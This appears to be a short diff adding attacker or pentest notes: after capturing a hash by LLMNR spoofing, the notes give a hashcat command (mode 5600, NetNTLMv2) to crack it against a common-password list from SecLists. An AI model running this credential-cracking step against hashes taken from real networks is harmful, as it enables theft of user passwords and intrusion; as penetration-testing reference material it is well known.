@@ -1,0 +1,6 @@
+take the hash from the file hash.txt (after llmnr spoofing)
+
+
+need to run on kali or install hashcat tool
+run:
+hashcat64.exe -m 5600 hash.txt <common password pool like https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt>
